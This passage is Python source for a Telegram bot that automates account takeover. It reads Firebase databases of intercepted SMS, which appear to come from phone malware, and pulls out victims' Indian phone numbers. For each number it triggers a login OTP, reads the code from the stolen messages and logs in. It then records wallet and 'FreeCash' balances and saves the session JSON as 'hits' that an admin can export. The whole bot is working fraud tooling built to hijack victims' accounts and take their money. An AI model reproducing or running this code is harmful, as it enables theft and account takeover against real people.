        text += f"{escape(body)}\n\n"

    if len(text) > 4000: text = text[:3900] + "\n<i>(truncated)</i>"
    await msg.edit_text(text, reply_markup=otp_check_kb())


# ═════════════════════════════════════════════
# 🧪 FIREBASE HEALTH
# ═════════════════════════════════════════════
async def test_panel(url):
    result = {"url": url, "status": "unknown", "clients": 0,
              "online": 0, "with_phones": 0, "response_ms": 0, "error": None}
    start = time.time()
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url.rstrip("/") + "/clients.json", timeout=8) as r:
                result["response_ms"] = int((time.time() - start) * 1000)
                if r.status != 200:
                    result["status"] = "dead"; result["error"] = f"HTTP {r.status}"; return result
                data = await r.json()
                if not isinstance(data, dict): result["status"] = "invalid"; return result
                result["clients"] = len(data)
                online_ids = [cid for cid, cd in data.items() if isinstance(cd, dict) and cd.get("status") is True]
                result["online"] = len(online_ids)
                wp = 0
                for cid in online_ids[:5]:
                    try:
                        async with s.get(url.rstrip("/") + f"/messages/{cid}.json?orderBy=\"$key\"&limitToLast=5", timeout=4) as mr:
                            if mr.status == 200:
                                msgs = await mr.json()
                                if msgs and re.search(r'\b[6-9]\d{9}\b', str(msgs)): wp += 1
                    except: pass
                result["with_phones"] = wp
                if result["online"] == 0: result["status"] = "empty"
                elif wp == 0: result["status"] = "no_phones"
                else: result["status"] = "working"
    except asyncio.TimeoutError:
        result["status"] = "timeout"; result["error"] = "Timeout"
    except Exception as e:
        result["status"] = "error"; result["error"] = str(e)[:80]
    return result

def fmt_health(r):
    icons = {"working":"✅","empty":"⚠️","no_phones":"📵","dead":"❌",
             "timeout":"⏱️","invalid":"🚫","error":"💥"}
    labels = {"working":"Working","empty":"No Online","no_phones":"No Phones",
              "dead":"Dead","timeout":"Timeout","invalid":"Invalid","error":"Error"}
    url_short = r["url"].replace("https://","").replace("http://","")[:35]
    icon = icons.get(r["status"], "❓"); label = labels.get(r["status"], r["status"])
    line = f"{icon} <code>{escape(url_short)}</code>\n    └ {label}"
    if r["clients"] > 0:
        line += f" • 📱 {r['clients']} • 🟢 {r['online']}"
        if r["with_phones"] > 0: line += f" • 📞 {r['with_phones']}/5"
    if r["error"]: line += f"\n    └ <i>{escape(r['error'])}</i>"
    return line

async def run_health(chat_id, message):
    panels = list(dict.fromkeys(load_admin_panels() + user_panels.get(chat_id, [])))
    if not panels:
        await message.edit_text("❌ <b>No panels!</b>", reply_markup=back_kb("auto")); return
    await message.edit_text(f"🧪 <b>Testing {len(panels)} panels...</b>")
    results = await asyncio.gather(*[test_panel(u) for u in panels])
    order = {"working":0,"no_phones":1,"empty":2,"timeout":3,"error":4,"dead":5,"invalid":6,"unknown":7}
    results.sort(key=lambda x: order.get(x["status"], 99))
    working = sum(1 for r in results if r["status"] == "working")
    total_online = sum(r["online"] for r in results)
    text = (
        "╔══════════════════════════╗\n"
        "║  🧪 <b>FIREBASE HEALTH</b>   ║\n"
        "╚══════════════════════════╝\n\n"
        f"📡 Tested: <code>{len(results)}</code>\n"
        f"✅ Working: <code>{working}</code>\n"
        f"🟢 Online: <code>{total_online}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    for r in results[:15]: text += fmt_health(r) + "\n"
    if len(results) > 15: text += f"\n<i>...{len(results)-15} more</i>"
    if len(text) > 4000: text = text[:3900] + "\n<i>(truncated)</i>"
    await message.edit_text(text, reply_markup=back_kb("auto"))


# ═════════════════════════════════════════════
# 🔥 AUTO BULK
# ═════════════════════════════════════════════
async def run_bulk(chat_id):
    panels = user_panels.get(chat_id, []) + load_admin_panels()
    if not panels:
        await bot.send_message(chat_id, "❌ <b>No panels!</b>", reply_markup=auto_kb(chat_id))
        active_bulk.discard(chat_id); return

    status = await bot.send_message(chat_id, f"🔥 <b>Scanning {len(panels)} panels...</b>")

    targets, seen = [], set()
    async with aiohttp.ClientSession() as s:
        client_tasks = [fb_fetch_clients_batch(s, url) for url in panels]
        results = await asyncio.gather(*client_tasks, return_exceptions=True)

    for url, clients in zip(panels, results):
        if not isinstance(clients, dict): continue
        online = [c for c, d in clients.items() if isinstance(d, dict) and d.get("status") is True]

        async def fetch_one(cid):
            m = await fb_get(url, f"messages/{cid}.json?orderBy=\"$key\"&limitToLast=10")
            if not m: return None
            p = extract_phone_from_msgs(m)
            return {"phone": p, "cid": cid, "url": url} if p else None

        sem = asyncio.Semaphore(SMS_FETCH_WORKERS)
        async def w(cid):
            async with sem: return await fetch_one(cid)
        batch = await asyncio.gather(*[w(c) for c in online])

        for t in batch:
            if t and t["phone"] not in seen:
                seen.add(t["phone"]); targets.append(t)

    if not targets:
        await status.edit_text("📭 <b>No online devices</b>", reply_markup=auto_kb(chat_id))
        active_bulk.discard(chat_id); return

    total = len(targets)
    await status.edit_text(
        f"🔥 <b>AUTO CHECK STARTED</b>\n\n"
        f"📊 Online: <code>{total}</code>\n"
        f"⚡ Workers: <code>{MAX_WORKERS}</code>"
    )

    stats = {"ok": 0, "fail": 0, "wallet": 0, "freecash": 0}
    lock = asyncio.Lock()

    async def process(t):
        phone, url, cid = t["phone"], t["url"], t["cid"]
        try:
            client = BBClient(phone)
            known = await fb_shallow(url, f"messages/{cid}.json")
            known_keys = set(known.keys()) if isinstance(known, dict) else set()

            st = await client.send_otp()
            if st != "SUCCESS":
                async with lock: stats["fail"] += 1
                await client.close(); return

            otp = None
            for _ in range(OTP_TIMEOUT // 3):
                await asyncio.sleep(3)
                msgs = await fb_get(url, f"messages/{cid}.json?orderBy=\"$key\"&limitToLast=15")
                if not isinstance(msgs, dict): continue
                for mk, mv in msgs.items():
                    if mk in known_keys or not isinstance(mv, dict): continue
                    txt = str(mv.get("body") or mv.get("message") or "")
                    otp = extract_bb_otp(txt)
                    if otp: break
                if otp: break

            if not otp:
                async with lock: stats["fail"] += 1
                await client.close(); return

            v_status, auth_data = await client.verify(otp)
            if v_status != "SUCCESS":
                async with lock: stats["fail"] += 1
                await client.close(); return

            wallet = await client.wallet()
            await asyncio.sleep(1)
            fc = await client.freecash()
            login_json = await client.get_login_json(auth_data)

            save_hit(phone, wallet, fc, login_json, chat_id, "Auto")

            async with lock:
                stats["ok"] += 1
                stats["wallet"] += wallet
                stats["freecash"] += fc
                n = stats["ok"] + stats["fail"]

            await bot.send_message(chat_id,
                f"✅ <b>[{n}/{total}]</b>\n"
                f"📱 <code>{escape(phone)}</code>\n"
                f"💰 ₹{wallet} | 🎁 ₹{fc}"
            )
            await broadcast_success(phone, wallet, fc, mode="Auto")
            await client.close()
        except Exception as e:
            async with lock: stats["fail"] += 1
            print(f"bulk err: {e}")

    sem = asyncio.Semaphore(MAX_WORKERS)
    async def w(t):
        async with sem: await process(t)
    await asyncio.gather(*[w(t) for t in targets])

    await bot.send_message(chat_id,
        "╔══════════════════════════╗\n"
        "║  🔥 <b>AUTO CHECK DONE</b> 🔥║\n"
        "╚══════════════════════════╝\n\n"
        f"📊 Total: <code>{total}</code>\n"
        f"✅ Success: <code>{stats['ok']}</code>\n"
        f"❌ Failed: <code>{stats['fail']}</code>\n\n"
        f"💰 Wallet: <code>₹{stats['wallet']}</code>\n"
        f"🎁 FreeCash: <code>₹{stats['freecash']}</code>",
        reply_markup=auto_kb(chat_id)
    )
    active_bulk.discard(chat_id)


# ═════════════════════════════════════════════
# 👑 ADMIN
# ═════════════════════════════════════════════
def build_admin_stats():
    total_hits = len(HITS); total_users = len(STATS)
    total_wallet = sum(int(h.get("wallet", 0) or 0) for h in HITS.values())
    total_fc = sum(int(h.get("freecash", 0) or 0) for h in HITS.values())
    manual_hits = sum(1 for h in HITS.values() if h.get("mode") == "Manual")
    auto_hits = sum(1 for h in HITS.values() if h.get("mode") == "Auto")
    json_hits = sum(1 for h in HITS.values() if h.get("mode") == "JSON")
    return (
        "╔══════════════════════════╗\n"
        "║  👑 <b>ADMIN — LIVE STATS</b>║\n"
        "╚══════════════════════════╝\n\n"
        "📊 <b>TOTALS:</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎁 Hits: <code>{total_hits}</code>\n"
        f"👥 Users: <code>{total_users}</code>\n"
        f"💰 Wallet: <code>₹{total_wallet}</code>\n"
        f"🎁 FreeCash: <code>₹{total_fc}</code>\n"
        f"💎 Grand: <code>₹{total_wallet + total_fc}</code>\n\n"
        "📈 <b>BY MODE:</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔍 Manual: <code>{manual_hits}</code>\n"
        f"🔥 Auto: <code>{auto_hits}</code>\n"
        f"🔐 JSON: <code>{json_hits}</code>"
    )

def build_admin_users():
    if not STATS: return "📭 <b>No user data</b>"
    su = sorted(STATS.items(), key=lambda x: x[1].get("wallet", 0), reverse=True)
    text = (
        "╔══════════════════════════╗\n"
        "║  👥 <b>USER TOTALS</b>       ║\n"
        "╚══════════════════════════╝\n\n"
        f"📊 Users: <code>{len(STATS)}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    for i, (uid, d) in enumerate(su[:15], 1):
        text += f"<b>#{i}</b> 👤 <code>{uid}</code>\n   🎁 {d.get('hits',0)} • 💰 ₹{d.get('wallet',0)} • 🎁 ₹{d.get('freecash',0)}\n\n"
    return text

def build_admin_hits(limit=25):
    if not HITS: return "📭 <b>No hits</b>"
    items = list(HITS.items())[-limit:][::-1]
    text = (
        "╔══════════════════════════╗\n"
        "║  🎁 <b>ALL HITS</b>          ║\n"
        "╚══════════════════════════╝\n\n"
        f"📊 Total: <code>{len(HITS)}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    for i, (phone, h) in enumerate(items, 1):
        text += (
            f"<b>#{i}</b> 📱 <code>{escape(phone)}</code>\n"
            f"   💰 ₹{h.get('wallet',0)} | 🎁 ₹{h.get('freecash',0)}\n"
            f"   🎯 {h.get('mode','?')} • 👤 <code>{h.get('user_id','?')}</code>\n\n"
        )
        if len(text) > 3500: text += "<i>(truncated)</i>"; break
    return text

async def export_hits(chat_id):
    if not HITS:
        await bot.send_message(chat_id, "📭 No hits"); return
    try:
        filename = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(json.dumps(HITS, indent=2, ensure_ascii=False))
        with open(filename, "rb") as f:
            await bot.send_document(chat_id, f, caption=f"📤 {len(HITS)} hits")
        os.remove(filename)
    except Exception as e:
        await bot.send_message(chat_id, f"❌ {e}")


# ═════════════════════════════════════════════
# 🎯 COMMANDS
# ═════════════════════════════════════════════
@dp.message(CommandStart())
async def cmd_start(msg: types.Message):
    if not is_private(msg): await reject_group(msg); return
    chat_id = msg.chat.id
    user_state.pop(chat_id, None)
    ok, nj = await check_joined(chat_id)
    if not ok: await send_join_prompt(chat_id, nj); return
    await msg.answer(
        "╔══════════════════════════╗\n"
        "║  🛒 <b>BB PREMIUM BOT</b>   ║\n"
        "╚══════════════════════════╝\n\n"
        f"👋 <b>Hey {escape(msg.from_user.first_name)}!</b>\n\n"
        "👇 <b>Select an option:</b>",
        reply_markup=main_menu_kb(chat_id)
    )

@dp.message(Command("menu"))
async def cmd_menu(msg: types.Message):
    if not is_private(msg): await reject_group(msg); return
    await msg.answer("🏠 <b>Menu</b>", reply_markup=main_menu_kb(msg.chat.id))

@dp.message(Command("admin"))
async def cmd_admin(msg: types.Message):
    if not is_private(msg) or msg.from_user.id != ADMIN_ID: return
    await msg.answer(build_admin_stats(), reply_markup=admin_kb())

@dp.message(Command("getjson"))
async def cmd_getjson(msg: types.Message):
    if not is_private(msg): await reject_group(msg); return
    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2:
        await msg.answer("Usage: <code>/getjson 9876543210</code>"); return
    digits = re.sub(r"\D", "", parts[1])[-10:]
    await send_login_json(msg.chat.id, digits)


# ═════════════════════════════════════════════
# 🎯 CALLBACKS
# ═════════════════════════════════════════════
@dp.callback_query()
async def on_cb(call: types.CallbackQuery):
    if not is_private(call):
        try: await call.answer("❌ Private only!", show_alert=True)
        except: pass
        return

    chat_id = call.message.chat.id
    data = call.data

    if data == "verify_join":
        ok, nj = await check_joined(chat_id)
        if ok:
            await call.answer("✅ Verified!")
            try: await call.message.delete()
            except: pass
            await send_main_menu(chat_id, call.from_user.first_name)
        else:
            await call.answer("❌ Join all!", show_alert=True)
            await send_join_prompt(chat_id, nj)
        return

    ok, nj = await check_joined(chat_id)
    if not ok:
        await call.answer("❌ Join channels first!", show_alert=True)
        await send_join_prompt(chat_id, nj); return

    if data == "menu":
        await send_main_menu(chat_id, call.from_user.first_name)
    elif data == "manual":
        user_state.pop(chat_id, None)
        await call.message.edit_text(
            "╔══════════════════════════╗\n"
            "║  🔍 <b>MANUAL MODE</b>      ║\n"
            "╚══════════════════════════╝\n\n👇 <b>Select method:</b>",
            reply_markup=manual_menu_kb())
    elif data == "manual_num":
        user_state[chat_id] = "WAITING_PHONE"
        await call.message.edit_text(
            "📱 <b>Send 10-digit number:</b>\n\nExample: <code>9876543210</code>",
            reply_markup=back_kb("manual"))
    elif data == "manual_json":
        user_state[chat_id] = "WAITING_JSON"
        await call.message.edit_text(
            "🔐 <b>Paste your login JSON:</b>",
            reply_markup=back_kb("manual"))
    elif data == "otp_check":
        user_state[chat_id] = "WAITING_OTP_CHECK"
        await call.message.edit_text(
            "╔══════════════════════════╗\n"
            "║  📩 <b>OTP CHECK</b>        ║\n"
            "╚══════════════════════════╝\n\n"
            "📱 <b>Send 10-digit number:</b>\n\n"
            "Bot will search Firebase and show\n"
            "<b>last 5 SMS</b> of this number.",
            reply_markup=back_kb("menu"))
    elif data == "auto":
        user_state.pop(chat_id, None)
        uc = len(user_panels.get(chat_id, []))
        ac = len(load_admin_panels())
        await call.message.edit_text(
            "╔══════════════════════════╗\n"
            "║  🔥 <b>AUTO FIREBASE</b> 🔥 ║\n"
            "╚══════════════════════════╝\n\n"
            f"📡 Your panels: <code>{uc}</code>\n"
            f"👑 Shared: <code>{ac}</code>\n\n👇 <b>Choose:</b>",
            reply_markup=auto_kb(chat_id))
    elif data == "get_json":
        user_state[chat_id] = "WAITING_GETJSON"
        await call.message.edit_text("📥 <b>Send phone number:</b>",
            reply_markup=back_kb("auto"))
    elif data == "health":
        await call.answer("🧪 Testing...")
        user_state.pop(chat_id, None)
        asyncio.create_task(run_health(chat_id, call.message))
    elif data == "panel_add":
        user_state[chat_id] = "WAITING_PANEL"
        await call.message.edit_text(
            "➕ <b>Send Firebase URLs (one per line)</b>",
            reply_markup=back_kb("auto"))
    elif data == "panel_list":
        panels = user_panels.get(chat_id, [])
        if not panels:
            await call.answer("📭 None added", show_alert=True); return
        text = "📋 <b>Your Panels</b>\n\n"
        for i, p in enumerate(panels[:10], 1):
            text += f"{i}. <code>{escape(p.replace('https://','')[:40])}</code>\n"
        await call.message.edit_text(text, reply_markup=back_kb("auto"))
    elif data == "panel_clear":
        user_panels[chat_id] = []
        await call.answer("🗑 Cleared!")
        await call.message.edit_text("✅ <b>All removed</b>", reply_markup=auto_kb(chat_id))
    elif data == "bulk_start":
        panels = user_panels.get(chat_id, []) + load_admin_panels()
        if not panels:
            await call.answer("❌ No panels!", show_alert=True); return
        if chat_id in active_bulk:
            await call.answer("⚠️ Running!", show_alert=True); return
        await call.answer("▶️ Starting...")
        active_bulk.add(chat_id)
        asyncio.create_task(run_bulk(chat_id))
    elif data == "stats":
        uid = str(chat_id)
        d = STATS.get(uid, {"hits": 0, "wallet": 0, "freecash": 0})
        await call.message.edit_text(
            "╔══════════════════════════╗\n"
            "║  📊 <b>YOUR STATS</b>       ║\n"
            "╚══════════════════════════╝\n\n"
            f"👤 <code>{chat_id}</code>\n"
            f"🎁 Hits: <code>{d.get('hits',0)}</code>\n"
            f"💰 ₹{d.get('wallet',0)} | 🎁 ₹{d.get('freecash',0)}\n"
            f"📡 Panels: <code>{len(user_panels.get(chat_id, []))}</code>",
            reply_markup=back_kb("menu"))
    elif data == "admin":
        if chat_id != ADMIN_ID:
            await call.answer("❌ Admin only", show_alert=True); return
        await call.message.edit_text(build_admin_stats(), reply_markup=admin_kb())
    elif data == "admin_stats":
        if chat_id != ADMIN_ID: return
        await call.message.edit_text(build_admin_stats(), reply_markup=admin_kb())
    elif data == "admin_users":
        if chat_id != ADMIN_ID: return
        await call.message.edit_text(build_admin_users(), reply_markup=admin_kb())
    elif data == "admin_hits":
        if chat_id != ADMIN_ID: return
        await call.message.edit_text(build_admin_hits(), reply_markup=admin_kb())
    elif data == "admin_export":
        if chat_id != ADMIN_ID: return
        await call.answer("📤 Exporting...")
        await export_hits(chat_id)
    elif data.startswith("json_"):
        phone = data.replace("json_", "")
        await send_login_json(chat_id, phone)

    try: await call.answer()
    except: pass


# ═════════════════════════════════════════════
# 📩 MESSAGES
# ═════════════════════════════════════════════
async def send_main_menu(chat_id, name="User"):
    user_state.pop(chat_id, None)
    await bot.send_message(chat_id,
        "╔══════════════════════════╗\n"
        "║  🛒 <b>BB PREMIUM BOT</b>   ║\n"
        "╚══════════════════════════╝\n\n"
        f"👋 <b>Hey {escape(name)}!</b>\n\n👇 <b>Select:</b>",
        reply_markup=main_menu_kb(chat_id))

@dp.message(F.text)
async def on_msg(msg: types.Message):
    if not is_private(msg): await reject_group(msg); return
    chat_id = msg.chat.id
    text = msg.text.strip()
    state = user_state.get(chat_id)

    ok, nj = await check_joined(chat_id)
    if not ok: await send_join_prompt(chat_id, nj); return

    if state == "WAITING_PHONE":
        d = re.sub(r"\D", "", text)
        if len(d) > 10: d = d[-10:]
        if len(d) != 10 or d[0] not in "6789":
            await msg.answer("⚠️ <b>Invalid!</b>", reply_markup=back_kb("manual")); return
        user_state.pop(chat_id, None)
        asyncio.create_task(manual_send_otp(chat_id, d)); return

    if state == "WAITING_MANUAL_OTP":
        otp = re.sub(r"\D", "", text)
        if len(otp) < 4 or len(otp) > 6:
            await msg.answer("⚠️ <b>4-6 digit OTP</b>", reply_markup=back_kb("manual")); return
        asyncio.create_task(manual_verify_otp(chat_id, otp)); return

    if state == "WAITING_JSON":
        user_state.pop(chat_id, None)
        asyncio.create_task(do_manual_json(chat_id, text)); return

    if state == "WAITING_GETJSON":
        d = re.sub(r"\D", "", text)
        if len(d) > 10: d = d[-10:]
        if len(d) != 10:
            await msg.answer("⚠️ <b>10 digits</b>", reply_markup=back_kb("auto")); return
        user_state.pop(chat_id, None)
        await send_login_json(chat_id, d); return

    if state == "WAITING_OTP_CHECK":
        d = re.sub(r"\D", "", text)
        if len(d) > 10: d = d[-10:]
        if len(d) != 10 or d[0] not in "6789":
            await msg.answer("⚠️ <b>Invalid!</b>", reply_markup=back_kb("menu")); return
        user_state.pop(chat_id, None)
        asyncio.create_task(do_otp_check(chat_id, d)); return

    if state == "WAITING_PANEL":
        urls = []
        for line in text.split("\n"):
            u = parse_fb_link(line.strip())
            if u: urls.append(u)
        if not urls:
            await msg.answer("⚠️ No valid URLs!"); return
        user_panels.setdefault(chat_id, [])
        added = 0
        for u in urls:
            if u not in user_panels[chat_id]:
                user_panels[chat_id].append(u); added += 1
        user_state.pop(chat_id, None)
        await msg.answer(
            f"✅ Added <code>{added}</code> panel(s)\n📡 Total: <code>{len(user_panels[chat_id])}</code>",
            reply_markup=auto_kb(chat_id)); return

    await msg.answer("👇 <b>Use the menu:</b>", reply_markup=main_menu_kb(chat_id))


# ═════════════════════════════════════════════
# 🚀 MAIN
# ═════════════════════════════════════════════
async def main():
    load_all()
    print("\n" + "=" * 55)
    print("  🛒 BB PREMIUM BOT v6.1")
    print("=" * 55)
    print(f"  Admin ID    : {ADMIN_ID}")
    print(f"  Group ID    : {GROUP_ID}")
    print(f"  Private Only: YES")
    print(f"  Colored Btn : YES")
    print(f"  Fast SMS    : {SMS_FETCH_WORKERS} workers")
    print(f"  FreeCash    : Bearer token fix")
    print(f"  Hits Saved  : {len(HITS)}")
    print("=" * 55)
    print("  🚀 Bot running...\n")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())